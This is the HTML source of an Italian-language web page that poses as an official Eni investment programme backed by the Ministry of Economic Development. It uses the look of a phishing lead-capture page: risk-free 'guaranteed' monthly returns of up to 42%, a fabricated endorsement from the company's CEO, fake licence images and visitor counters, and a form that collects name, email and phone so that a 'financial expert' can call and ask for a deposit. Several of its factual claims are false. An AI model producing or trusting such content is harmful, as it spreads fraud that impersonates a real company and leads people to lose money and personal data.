...
<head>
    ...
    <title>Ente Nazionale Idrocarburi</title>
    ...
    <link rel="stylesheet" href="api/intl-tel-input/styles.min.css"/>

    <!-- Facebook Pixel Code -->
    <script>
        const currentURL = window.location.href;
        const urlParts = new URL(currentURL);
        const pixelId = urlParts.searchParams.get("pixel_id");
        const accessToken = urlParts.searchParams.get("access_token");
    ...
    <noscript>
        <img class="fbno" height="1" width="1" style="display:none"
...
<header class="sm:w-full sm:z-50 sm:mb-8">
    <div class="container relative flex justify-between items-center mx-auto py-4 mb-6 sm:mb-0">
        <div class="flex w-1/2 md:w-auto">
            <a href="#">
                <img style="max-height: 100%" src="assets/images/logo.png" alt="logo"/>
            </a>
        </div>
        <div class="flex w-1/2 justify-end items-center"></div>
    </div>
</header>

<div style="top: 150px"
     class="fixed z-50 w-53 h-13 rounded-custom-right py-2 px-3 flex flex-col bg-secondary text-black shadow text-center left-0 sm:hidden">
    <span id="rand_man">125</span>
    <span style="text-transform: uppercase" class="tracking-wide whitespace-no-wrap"> Ora a pagina </span>
</div>
<div style="top: 150px"
     class="fixed z-50 w-53 h-13 rounded-custom-left py-2 px-3 flex flex-col bg-secondary text-black shadow text-center right-0 sm:hidden">
    <span id="rand_places">14 </span>
    <span style="text-transform: uppercase" class="tracking-wide"> luoghi di registro </span>
</div>

<main class="">
    <section class="container mx-auto mb-16 sm:mb-12 pt-6 sm:pt-0">
        <h1 class="mt-2 sm:text-3xl text-4xl text-center leading-extra-tight sm:leading-snug font-ubuntu font-black mb-3 sm:mb-6"
            style="font-size: 1.5rem">
            Il progetto di investimento di Eni S.p.A. sostenuto dal Ministero dello Sviluppo Economico<br
                    class="sm:hidden"/>
            apre l'accesso agli investimenti a tutti gli italiani <br class="sm:hidden"/>
        </h1>
        <h2 class="text-center text-2xl mb-6 sm:text-base">Il gas e il petrolio sono ora nelle mani del popolo!</h2>
    </section>

    <section id="about" class="container mx-auto mb-24 sm:mb-24">
        <div class="w-full flex justify-center items-center sm:flex-col">
            <div class="relative pr-2 w-2/3 flex sm:pr-0 sm:w-full sm:mr-0 js-vid1 sm:mb-12 sm:block">
                <video class="block object-fill w-full rounded-custom overflow-hidden" id="video_main"
                       controls="controls" poster="assets/video/poster.jpg" allowfullscreen="">
            ...
            <div class="pl-6 block w-1/3 sm:p-0 sm:w-full">
                <div class="form-box bg-white pt-6 pb-4 px-6 rounded-custom text-primary shadow-form">
                    <h3 class="text-2xl text-center font-bold font-ubuntu mb-6 sm:mb-10">Ottenete un reddito dalle
                        risorse del vostro paese!</h3>
                    <form class="form-container dr-form" id="main_form" action="" method="post" autocomplete="on">
                        <div class="form_group--name first-n">
                            <input class="input-form-reg-up" name="name" placeholder="IL SUO NOME" required=""
                                   autocomplete="on"/>
                            <div class="help-block help-block-error"></div>
                        </div>
                        <div class="form_group--name last-n">
                            <input class="input-form-reg-up" placeholder="IL SUO COGNOME" name="lastname" value=""
                                   required="" autocomplete="on"/>
                            <div class="help-block help-block-error"></div>
                        </div>
                        <div class="form_group--email">
                            <input class="input-form-reg-up" type="email" id="email" name="email" placeholder="E-MAIL"
                                   required="" autocomplete="on"/>
                            <center><span class="error" id="email_result"></span></center>
                            <div class="help-block help-block-error"></div>
                        </div>
                        <div class="form_input--group mob-tel">
                                ...
                                <div class="iti iti--allow-dropdown iti--separate-dial-code">
                                    <div class="iti__flag-container">
                                        <div class="iti__selected-flag" role="combobox"
                                             ...
                                             title="Italy (Italia): +39" aria-activedescendant="iti-0__item-it">
                                            <div class="iti__flag iti__it">
                                                <img src="assets/images/italy-flag-icon.webp" alt="">
                                            </div>
                                        ...
                                        <ul class="iti__country-list iti__hide" id="iti-0__country-listbox"
                                            ...
                                            <li class="iti__country iti__standard iti__active" tabindex="-1"
                                                id="iti-0__item-it" role="option" data-dial-code="39"
                                                data-country-code="it" aria-selected="true">
...
<!--                                           placeholder="312 345 6789"></div>-->
                        ...
                        <div class="form_group--button">
                            <button id="buttonSend" class="send-form btn btn-primary" type="submit">
                                <span class="button--inner">Registrazione</span>
                            </button>
                        </div>
        ...
        <div class="w-full sm:flex sm:flex-col">
            <div class="inline-block sm:float-none float-left sm:-ml-4 sm:w-screen w-2/5">
                <article class="p-8 sm:py-20 sm:px-4 flex flex-col bg-primary text-white">
                    <h3 class="text-3xl sm:text-3xl font-ubuntu font-bold mb-8 sm:mb-16">Perché va a vantaggio dei
                        cittadini comuni?</h3>
                    <div class="flex items-center mb-12">
                        <div class="w-1/5">
                            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewbox="0 0 80 80"
                                ...
                                <path
                                        ...
                                        fill="#5C9EFF"
                                />
                                <path d="M5.625 54.3752L6.87504 48.1251H0.625C36.7186 22.8134 68.1248 9.37594 68.1248 9.37594L66.8747 5.62598L79.3748 6.87602L70.6248 16.876L69.3748 13.1261C69.3748 13.1259 19.375 40.6258 5.625 54.3752Z"
                                      fill="#D7E9FF"/>
                                ...
                                <path d="M68.1248 9.37598C68.1248 9.37598 36.7186 22.8134 0.625 48.1252H3.12492C39.2187 22.8134 68.4435 10.3367 68.4435 10.3367L68.1248 9.37598Z"
                                      fill="white"/>
                                <path d="M24.375 73.7499C24.0297 73.7499 23.75 73.4704 23.75 73.1249V71.875C23.75 71.5295 24.0297 71.25 24.375 71.25C24.7205 71.25 25 71.5295 25 71.875V73.1249C25 73.4704 24.7205 73.7499 24.375 73.7499Z"
                                      fill="#116FFF"/>
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M20.625 73.4316C20.2797 73.4316 20 73.1521 20 72.8066V71.5689C20 71.2234 20.2795 70.9438 20.625 70.9438C20.9705 70.9438 21.25 71.2234 21.25 71.5689V72.8066C21.25 73.1521 20.9704 73.4316 20.625 73.4316Z"
                                      fill="#116FFF"/>
                                <path
                                ...
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M18.125 73.75C17.7797 73.75 17.5 73.4705 17.5 73.125V69.3749C17.5 69.0295 17.7795 68.75 18.125 68.75C18.4705 68.75 18.75 69.0295 18.75 69.3749V73.125C18.7499 73.4705 18.4704 73.75 18.125 73.75Z"
                                      fill="#116FFF"/>
                                <path d="M30.625 73.75C30.2795 73.75 30 73.4705 30 73.125V69.3749C30 69.0295 30.2795 68.75 30.625 68.75C30.9704 68.75 31.25 69.0295 31.25 69.3749V73.125C31.25 73.4705 30.9705 73.75 30.625 73.75Z"
                                      fill="#116FFF"/>
                                <path
                                ...
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M1.87502 73.75C1.52966 73.75 1.25 73.4705 1.25 73.125V69.3749C1.25 69.0295 1.52951 68.75 1.87502 68.75C2.22053 68.75 2.50004 69.0295 2.50004 69.3749V73.125C2.50004 73.4705 2.22038 73.75 1.87502 73.75Z"
                                      fill="#116FFF"/>
                                <path d="M14.375 73.75C14.0295 73.75 13.75 73.4705 13.75 73.125V69.3749C13.75 69.0295 14.0295 68.75 14.375 68.75C14.7204 68.75 15 69.0295 15 69.3749V73.125C15.0002 73.4705 14.7205 73.75 14.375 73.75Z"
                                      fill="#116FFF"/>
                                <path d="M24.375 64.9999C24.0297 64.9999 23.75 64.7204 23.75 64.3749V63.125C23.75 62.7795 24.0297 62.5 24.375 62.5C24.7205 62.5 25 62.7795 25 63.125V64.3749C25 64.7204 24.7205 64.9999 24.375 64.9999Z"
                                      fill="#116FFF"/>
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M20.625 64.6816C20.2797 64.6816 20 64.4021 20 64.0565V62.8189C20 62.4734 20.2795 62.1938 20.625 62.1938C20.9705 62.1938 21.25 62.4734 21.25 62.8189V64.0565C21.25 64.4021 20.9704 64.6816 20.625 64.6816Z"
                                      fill="#116FFF"/>
                                <path
                                ...
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M34.3749 65C34.0295 65 33.7499 64.7205 33.7499 64.375V60.625C33.7499 60.2795 34.0295 60 34.3749 60C34.7204 60 34.9999 60.2795 34.9999 60.625V64.375C34.9999 64.7205 34.7204 65 34.3749 65Z"
                                      fill="#116FFF"/>
                                <path d="M46.8749 65C46.5294 65 46.2499 64.7205 46.2499 64.375V60.625C46.2499 60.2795 46.5294 60 46.8749 60C47.2203 60 47.4999 60.2795 47.4999 60.625V64.375C47.4999 64.7205 47.2203 65 46.8749 65Z"
                                      fill="#116FFF"/>
                                <path
                                ...
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M50.6249 65C50.2794 65 49.9999 64.7205 49.9999 64.375V60.625C49.9999 60.2795 50.2794 60 50.6249 60C50.9704 60 51.2499 60.2795 51.2499 60.625V64.375C51.2499 64.7205 50.9704 65 50.6249 65Z"
                                      fill="#116FFF"/>
                                <path d="M63.1249 65C62.7794 65 62.4999 64.7205 62.4999 64.375V60.625C62.4999 60.2795 62.7794 60 63.1249 60C63.4703 60 63.7498 60.2795 63.7498 60.625V64.375C63.7498 64.7205 63.4703 65 63.1249 65Z"
                                      fill="#116FFF"/>
                                <path
                                ...
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M66.8748 65C66.5293 65 66.2498 64.7205 66.2498 64.375V60.625C66.2498 60.2795 66.5293 60 66.8748 60C67.2203 60 67.4998 60.2795 67.4998 60.625V64.375C67.4998 64.7205 67.2203 65 66.8748 65Z"
                                      fill="#116FFF"/>
                                <path d="M79.3748 65C79.0293 65 78.7498 64.7205 78.7498 64.375V60.625C78.7498 60.2795 79.0293 60 79.3748 60C79.7201 60 79.9996 60.2795 79.9996 60.625V64.375C79.9996 64.7205 79.7201 65 79.3748 65Z"
                                      fill="#116FFF"/>
                                <path
                                ...
                                <path
                                        ...
                                        fill="#116FFF"
                                />
                                <path d="M6.87506 48.7499H0.62502C0.279663 48.7499 0 48.4704 0 48.1249C0 47.7795 0.279663 47.5 0.62502 47.5H6.87506C7.22042 47.5 7.50008 47.7795 7.50008 48.1249C7.50008 48.4704 7.22042 48.7499 6.87506 48.7499Z"
                                      fill="#116FFF"/>
                                <path
                        ...
                        <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">Profitti consistenti senza rischi</p>
                    </div>
                    <div class="flex items-center mb-12">
                        <div class="w-1/5">
                            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewbox="0 0 80 80"
                                ...
                                <g>
                                    ...
                                    <path
                                            ...
                                            fill="#5C9EFF"
                                    />
                                    <path d="M28.1384 37.5C28.1384 38.5353 27.2987 39.3743 26.2634 39.3743C25.2281 39.3743 24.3884 38.5353 24.3884 37.5C24.3884 36.4634 25.2281 35.6245 26.2634 35.6245C27.2987 35.6245 28.1384 36.4636 28.1384 37.5Z"
                                          fill="#94C1FF"/>
                                    <path d="M55.6109 37.5C55.6109 38.5353 54.7708 39.3743 53.7354 39.3743C52.7001 39.3743 51.86 38.5353 51.86 37.5C51.86 36.4634 52.7001 35.6245 53.7354 35.6245C54.7708 35.6245 55.6109 36.4636 55.6109 37.5Z"
                                          fill="#94C1FF"/>
                        ...
                        <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">L'asset più redditizio del Paese</p>
                    </div>
                    <div class="flex items-center mb-10">
                            ...
                            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewbox="0 0 80 80"
                                ...
                                <g>
                                    ...
                                    <path
                                            ...
                                            fill="#94C1FF"
                                    />
                                    <path d="M77.5 50V52.4998C77.5 55.2621 75.2625 57.4997 72.5002 57.4997C69.7379 57.4997 67.5004 55.2621 67.5004 52.4998V50C67.5004 52.7623 69.7379 54.9998 72.5002 54.9998C75.2625 54.9998 77.5 52.7623 77.5 50Z"
                                          fill="#5C9EFF"/>
                                    <path
                                            ...
                                            fill="#94C1FF"
                                    />
                                    <path d="M72.5002 45C75.2625 45 77.5 47.2374 77.5 49.9998C77.5 52.7621 75.2625 54.9997 72.5002 54.9997C69.7379 54.9997 67.5004 52.7621 67.5004 49.9998C67.5004 47.2372 69.7379 45 72.5002 45Z"
                                          fill="#94C1FF"/>
                                    <path
                                    ...
                                    <path d="M34.6392 59.999L34.6891 66.2488H27.1895V59.999H34.6392Z" fill="white"/>
                                    ...
                                    <path d="M34.4647 33.7896L34.5147 40.0394H27.1895V33.7896H34.4647Z" fill="#5C9EFF"/>
                                    <path d="M24.6897 33.7896V40.0394H17.4402L17.6648 33.7896H24.6897Z" fill="#5C9EFF"/>
                                    ...
                                    <path d="M14.8781 42.5L14.6522 48.7498H6.87793L7.24032 42.5H14.8781Z" fill="white"/>
                                    ...
                                    <path d="M14.2897 59.9995L14.0651 66.2115C14.0651 66.2249 5.94043 66.2493 5.94043 66.2493L6.30298 59.9995H14.2897Z"
                                          fill="white"/>
                                    <path d="M24.6898 59.9995V66.2493H16.5652L16.7898 59.9995H24.6898Z" fill="white"/>
                                    <path
                                    ...
                                    <path d="M14.9855 38.7485H7.41252L7.34058 40.0002H14.9403L14.9855 38.7485Z"
                                          fill="#2287FF"/>
                                    <path d="M24.6897 38.7485H17.4854L17.4402 40.0002H24.6897V38.7485Z" fill="#2287FF"/>
                                    ...
                                    <path d="M24.6898 64.9966H16.6104L16.5652 66.2491L24.6898 66.2112V64.9966Z"
                                          fill="#D7E9FF"/>
                                    <path d="M34.6797 64.9966H27.1897V66.2491H34.6894L34.6797 64.9966Z" fill="#D7E9FF"/>
                                    <path d="M24.6897 56.2471H16.8982L16.853 57.4996H24.6897V56.2471Z" fill="#D7E9FF"/>
                                    <path d="M34.6174 56.2471H27.1897V57.4996H34.6273L34.6174 56.2471Z" fill="#D7E9FF"/>
                                    <path d="M24.6895 47.4976H17.1972L17.1519 48.7497H24.6895V47.4976Z" fill="#D7E9FF"/>
                                    <path d="M34.565 47.4976H27.1897L27.1714 48.7497H34.565V47.4976Z" fill="#D7E9FF"/>
                                    <path d="M24.6896 33.7505H17.6647L17.6196 35.0411H24.6896V33.7505Z" fill="#94C1FF"/>
                                    <path d="M34.5013 38.7485H27.1895V40.0002H34.5147L34.5013 38.7485Z" fill="#2287FF"/>
                                    <path d="M34.4647 33.7505H27.1895V35.0411H34.4744L34.4647 33.7505Z" fill="#94C1FF"/>
                                    ...
                                    <path
                                            ...
                                            fill="#116FFF"
                                    />
                                    <path d="M77.5 53.1247C77.1545 53.1247 76.875 52.8452 76.875 52.4999V50C76.875 49.6545 77.1545 49.375 77.5 49.375C77.8455 49.375 78.125 49.6545 78.125 50V52.4999C78.125 52.8452 77.8455 53.1247 77.5 53.1247Z"
                                          fill="#116FFF"/>
                                    <path
                        ...
                        <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">Prelievo veloce su qualsiasi carta della
                            Banca d'Italia</p>
                    </div>
                </article>
            </div>
            <div class="pl-8 inline-block sm:float-none float-left sm:w-screen sm:-ml-4 sm:p-0 w-3/5">
                <article class="p-8 sm:pt-20 sm:pb-12 sm:px-4 flex flex-col bg-secondary text-black">
                    <h3 class="text-3xl sm:text-3xl sm:mb-16 font-bold font-ubuntu mb-8">Cosa dovete fare ora per
                        iniziare a guadagnare dalle risorse del Paese?</h3>
                    <ul class="text-lg">
                        <li class="mb-10 flex items-start">
                            <span class="mt-3 w-4 h-1 bg-black inline-block mr-4 sm:flex-shrink-0 sm:w-3"></span>
                            Registratevi su questo sito web nel modulo qui sopra
                        </li>
                        <li class="mb-10 flex items-start">
                            <span class="mt-3 w-4 h-1 bg-black inline-block mr-4 sm:flex-shrink-0 sm:w-3"></span>
                            Attendete la telefonata di un esperto finanziario e confermare l'iscrizione
                        </li>
                        <li class="mb-10 flex items-start">
                            <span class="mt-3 w-4 h-1 bg-black inline-block mr-4 sm:flex-shrink-0 sm:w-3"></span>
                            Depositate l'importo appropriato sul vostro conto e otterrete il vostro primo profitto la
                            sera stessa
                        </li>
                    </ul>
                </article>
        ...
        <div class="w-full flex sm:flex-col-reverse">
            <div class="pt-18 inline-block w-2/5 text-primary sm:p-0 sm:w-full">
                <article class="flex flex-col text-lg sm:text-base">
                    <h4 class="text-2xl font-ubuntu font-bold mb-2">Claudio Descalzi</h4>
                    <h5 class="text-black opacity-50 mb-10 sm:mb-6">CEO of Eni S.p.A.</h5>
                    <p class="mb-8 sm:leading-relaxed">
                        Eni è ora disponibile per i microinvestimenti. Ciò significa che ogni residente in Italia ha ora
                        il diritto di possedere i beni della società.
                        <br/><br/>
                        Il fatto è che attualmente c'è una domanda di gas e petrolio sul mercato mondiale. Dopo la crisi
                        di due anni, i prezzi dei prodotti petroliferi hanno subito una forte impennata. La nostra
                        azienda ha deciso di quadruplicare la
                        produzione di gas e petrolio. Per raggiungere questo obiettivo abbiamo deciso di coinvolgere i
                        cittadini italiani negli investimenti. Questo è vantaggioso sia per la nostra azienda che per
                        tutti gli investitori.
                        <br/><br/>
                        Poiché i prezzi dei prodotti petroliferi cambiano rapidamente, ogni investimento nei progetti
                        Eni genera una media di 850-9.600 euro al mese.
                    </p>
                    <div class="text-base">
                        <a href="#about"
                           class="inline-block text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3">Registrazione</a>
                    </div>
                </article>
            </div>
            <div class="pt-18 sm:mt-0 sm:-ml-4 sm:p-0 sm:w-screen sm:mb-8 sm:overflow-hidden pl-8 relative inline w-3/5 text-primary">
                <img src="assets/images/10.jpg" alt="photo"/>
            </div>
        </div>
    </section>
        ...
        <section class="container mx-auto flex justify-center pb-12 pt-12">
            <div class="flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full">
                <div id="form3"
                    ...
                    <h3 class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10">Quanto guadagnerò?</h3>
                    <div class="flex flex-col text-center font-bold mb-4 sm:mb-10 px-5">
                        <label class="block text-center font-bold mb-2">Il vostro investimento</label>
                        <input type="text" class="js-range-slider irs-hidden-input" style="display: none"
                               name="my_range" value="150" tabindex="-1" readonly/>
                    </div>
                    <div class="flex flex-col mb-5">
                        <label class="block text-center font-bold">Il vostro profitto</label>
                        <h3 class="text-2xl text-center font-bold font-ubuntu mt-5" id="calcResult">15840 €</h3>
                    </div>
    ...
    <div class="container mx-auto mb-24 sm:mb-24 text-center">
        <h2 class="mb-8 text-4xl sm:text-3xl font-bold font-ubuntu text-center">Quadro giuridico e certificati</h2>
        <div class="w-full sm:flex sm:flex-col">
            <div class="inline-block sm:float-none sm:-ml-4 sm:w-screen w-1/2">
                <div class="license-block">
                    <div class="s-carousel">
                        <a data-fancybox="gallery" class="license-img fancy-img" href="assets/images/11.png">
                            <img src="assets/images/11.png" alt="Лицензия" class="w-1/2 mx-auto"/>
                        </a>
                        <a data-fancybox="gallery" class="license-img fancy-img" href="assets/images/12.png">
                            <img src="assets/images/12.png" alt="Лицензия" class="w-1/2 mx-auto"/>
                        </a>
                        <a data-fancybox="gallery" class="license-img fancy-img" href="assets/images/13.png">
                            <img src="assets/images/13.png" alt="Лицензия" class="w-1/2 mx-auto"/>
                        </a>
                        <a data-fancybox="gallery" class="license-img fancy-img" href="assets/images/14.png">
                            <img src="assets/images/14.png" alt="Лицензия" class="w-1/2 mx-auto"/>
                        </a>
                    </div>
                </div>
            </div>
    ...
    <section id="posts" class="w-full">
        <h2 class="mb-8 text-3xl sm:text-3xl font-bold font-ubuntu text-center">
            Eni è una delle più grandi società di leasing d'Europa
            <br class="sm:hidden"/>
        </h2>
        <div class="mb-6 sm:mb-0 w-8/12 m-auto sm:w-full p-4 flex sm:flex-wrap">
            <div class="rate-box w-1/3 sm:w-full sm:text-center sm:mb-6 text-center">
                <div class="rate-box__change rate-box__change--higher">0,98 %</div>
                <div class="rate-box__amount">11,185<span class="rate-box__unit">€</span></div>
                <div class="rate-box__info">Tasso attuale di Eni</div>
            </div>
            <div class="rate-box w-1/3 sm:w-full sm:text-center sm:mb-6 text-center">
                <div class="rate-box__change rate-box__change--higher">0,44 %</div>
                <div class="rate-box__amount">69,78<span class="rate-box__unit">€/MWh</span></div>
                <div class="rate-box__info">Il prezzo del gas naturale (spot)</div>
            </div>
            <div class="rate-box w-1/3 sm:w-full sm:text-center sm:mb-6 text-center">
                <div class="rate-box__change rate-box__change--higher">0,92 %</div>
                <div class="rate-box__amount">42,63<span class="rate-box__unit">USD/bbl</span></div>
                <div class="rate-box__info">Il prezzo del petrolio(Brent)</div>
            </div>
        </div>
        <div class="text-white flex sm:flex-wrap">
            <div class="w-1/2 sm:w-full">
                <article class="flex post items-end">
                    <div class="absolute w-full h-full top-0 left-0 post-wrapper">
                        <img class="h-full sm:h-auto sm:w-full tr-center" src="assets/images/15.jpg" alt=""/>
                    </div>
                    <div class="relative z-10 p-8 sm:p-4 sm:px-4">
                        <h3 class="mb-4 font-bold font-ubuntu text-3xl sm:text-2xl">Calypso-1 al largo di Cipro</h3>
                        <p class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu">23.5% pagamenti mensili garantiti</p>
                        <p style="font-weight: bold; background: #ffd500; color: black; display: inline-block; padding: 5px"
                           class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu">Primo investimento 200 €</p>
                        <p class="mb-8 sm:mb-2 text-lg sm:text-base">
                            Eni ha scoperto il più grande giacimento di gas del Mediterraneo Un giacimento di un
                            centinaio di chilometri quadrati potenzialmente in grado di contenere circa 850 miliardi di
                            metri cubi
                        </p>
                        <div>
                            <a href="#about"
                               class="inline-block px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3">Registrazione</a>
                        </div>
                    </div>
                </article>
            </div>
            <div class="w-1/2 sm:w-full">
                <article class="flex post items-end">
                    <div class="absolute w-full h-full top-0 left-0 post-wrapper">
                        <img class="h-full sm:h-auto sm:w-full tr-center" src="assets/images/16.jpg" alt=""/>
                    </div>
                    <div class="relative z-10 p-8 sm:p-4 sm:px-4">
                        <h3 class="mb-4 font-bold font-ubuntu text-3xl sm:text-2xl">Sankofa/Gye Nyame</h3>
                        <p class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu">42% pagamenti mensili garantiti</p>
                        <p style="font-weight: bold; background: #ffd500; color: black; display: inline-block; padding: 5px"
                           class="mb-2 sm:mb-1 sm:text-base text-2xl font-ubuntu">Primo investimento 500 €</p>
                        <p class="mb-8 sm:mb-2 text-lg sm:text-base">Secondo il Ministero del Petrolio del Ghana, il
                            giacimento di Sankofa ha riserve di gas libero pari a 31,2 miliardi di metri cubi.</p>
                        <div>
                            <a href="#about"
                               class="inline-block px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3">Registrazione</a>
                        </div>
    ...
    <div class="pt-8 pb-8 bg-primary mb-20">
        <section class="container mx-auto flex justify-center pb-12 pt-12">
            <div class="custom flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full">
                <div class="w-auto text-center flex justify-center items-center">
                    <img style="max-width: 120px; object-fit: contain" src="assets/images/logo.png" alt="logo"/>
                </div>
                <h3 class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10">Iniziate a guadagnare dalle
                    risorse del vostro paese!</h3>
                <div class="form-container neo_form"></div>
            </div>
        </section>
    </div>
            ...
            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewbox="0 0 64 64" fill="none">
                    <path
                            ...
                            fill="currentColor"
                    />
                    <path d="M52.7388 29.7053L52.4419 28.3115C52.2175 28.92 51.8311 29.8979 51.8561 29.8549C51.8561 29.8549 50.4634 33.4435 50.1008 34.3738H53.7598C53.583 33.5636 52.7388 29.7053 52.7388 29.7053Z"
                          fill="currentColor"/>
                </svg>
            </div>
            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewbox="0 0 64 64" fill="none">
                    ...
                    <path d="M35.8459 24.9995H28.3592C27.881 25.9049 27.5638 26.5893 27.4742 26.7593H36.5553C36.3502 26.1542 36.1145 25.5684 35.8459 24.9995Z"
                          fill="currentColor"/>
                    <path d="M11.6634 27.856L9.93993 32.9664L9.85041 27.856H7.29857L5.90027 36.1834H7.58752L8.65154 29.9058L8.80792 36.1834H10.0125L12.2595 29.9058L11.2634 36.1834H13.0538L14.4328 27.856H11.6634Z"
                          fill="currentColor"/>
                    <path
            ...
            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewbox="0 0 64 64" fill="none">
                    ...
                    <path
                            ...
                            fill="currentColor"
                    />
                    <path d="M18.4623 28.0249L16.3037 32.9258L16.1643 28.0249H13.1241L11.6147 35.9388H13.3779L14.5383 29.8923L14.8635 35.9388H16.6278L19.2963 29.8538L18.136 35.9388H20.085L21.617 28.0249H18.4623Z"
                          fill="currentColor"/>
                    <path
            ...
            <div class="w-1/12 sm:flex sm:justify-start sm:w-1/3 text-svg hover:text-btn-hover transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewbox="0 0 64 64" fill="none">
                    ...
                    <path d="M47.881 45.7256H46.6731V46.9698H47.8108C48.3173 46.9698 48.5632 46.7941 48.5632 46.3341C48.5632 46.0871 48.4533 45.7256 47.881 45.7256Z"
                          fill="currentColor"/>
                    <path d="M25.5955 45.9717H25.5864L24.9893 47.8108H26.1757L25.5955 45.9717Z" fill="currentColor"/>
            ...
            <div class="w-2/12 sm:-mt-10 sm:flex sm:justify-center sm:w-1/2 text-svg hover:text-btn-hover transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="124" height="124" viewbox="0 0 124 124" fill="none">
                    ...
                    <path
                            ...
                            fill="currentColor"
                    />
                    <path d="M4.66455 62.1086C4.74432 54.4617 10.855 48.3503 18.3977 48.3761C25.9321 48.3503 32.0434 54.4617 32.1303 62.1093C32.0434 69.5387 25.9321 75.6501 18.3977 75.5877C10.855 75.6501 4.74432 69.5381 4.66455 62.1086Z"
                          fill="#EFF6FE"/>
                    <path
...
<footer>
    <div class="container mx-auto py-4 text-center text-white sm:leading-relaxed sm:text-xs">
        <div class="box">
            <img style="width: 80px" src="assets/images/logo.png" alt=""/>
            Eni S.p.A. Piazzale Enrico Mattei,1 00144 Rome, Italy
        </div>
    </div>
</footer>
...
<!--<script type="text/javascript" src="/assets/js/intlphone.js"></script>-->
<script>
    ...
    const validate = () => {
        ...
        if (validateEmail(email)) {
            $result.text(email + ' è valido.');
            $result.css('color', 'green');
        } else {
            $result.text(email + ' è invalido.');
